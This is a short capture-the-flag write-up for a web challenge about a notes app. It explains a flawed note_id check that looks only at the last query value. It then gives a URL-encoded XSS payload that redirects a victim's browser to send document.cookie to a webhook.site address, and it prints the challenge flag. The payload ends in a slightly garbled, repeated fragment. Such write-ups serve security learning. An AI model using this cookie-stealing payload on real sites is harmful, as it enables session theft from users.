# Juggernaut

Solved by: @vicevirus

## Question:
I gave task to Juggernaut to make a notes app for me. He made it but I think he is made some blunder. Can you find it?

## Solution:
This checks if `note_id` is valid only at the back/last part. To bypass, simply put the XSS payload in the name parameter at the front.
```
note_id = parsed_url.query.split('=')[-1]
if len(note_id) == 32 and all(c in '0123456789abcdef' for c in note_id):
```

report this link

```
http://35.224.222.30:4007/view?name=%3C/script%3E%3Cscript%3Elocation=%27https://webhook.site/bfb7ca18-de82-40ce-8bb2-930d503363d4/?c=%27%2bdocument.cookie%3C/script%3E.cookie%3C/script%3E&note=c33b70ea7fa441725a8c015e4296e4be
```

**Flag:** `flag{N3x7_t1m3_1_w0n7_g1v3_t45k_70_Ju993rn4u7}`
